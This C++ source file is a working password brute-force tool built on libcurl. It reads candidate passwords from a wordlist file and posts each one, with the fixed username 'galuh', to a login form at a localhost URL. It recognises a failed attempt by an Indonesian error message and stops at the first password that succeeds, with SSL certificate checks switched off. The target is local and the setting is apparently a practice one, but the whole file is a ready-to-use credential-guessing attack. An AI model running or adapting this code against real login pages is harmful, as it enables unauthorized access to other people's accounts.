#include <iostream>
#include <string>
#include <fstream>
#include <curl/curl.h>

using namespace std;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

bool login(CURL* curl, const string& username, const string& password, string& responseData) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/dedayu/login2");

    string postData = "username=" + username + "&password=" + password + "&login=submit";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());


    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return false;
    } else {
        return true;
    }
}

int main() {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        string username = "galuh";
        string responseData;
        bool success = false;

        ifstream inputFile("pass2.txt");
        if (!inputFile.is_open()) {
            cerr << "gagal membuka pass.txt" << endl;
            return 1;
        }
        
        string password;
        while (getline(inputFile, password)) {
            responseData.clear();
            if (login(curl, username, password, responseData)) {
                if (responseData.find("Maaf, Password Anda Salah") != string::npos) {
                	system("cls");
                    cout << "Akun salah, mencoba lagi..." <<password<<endl;
                } else {
                	system("cls");
                    cout << "Login berhasil dengan password: " << password << endl;
                    success = true;
                    break;
                }
            } else {
                cout << "Permintaan gagal, mencoba lagi..." << endl;
            }
        }

        if (!success) {
            cout << "Gagal login setelah mencoba semua password." << endl;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    return 0;
}

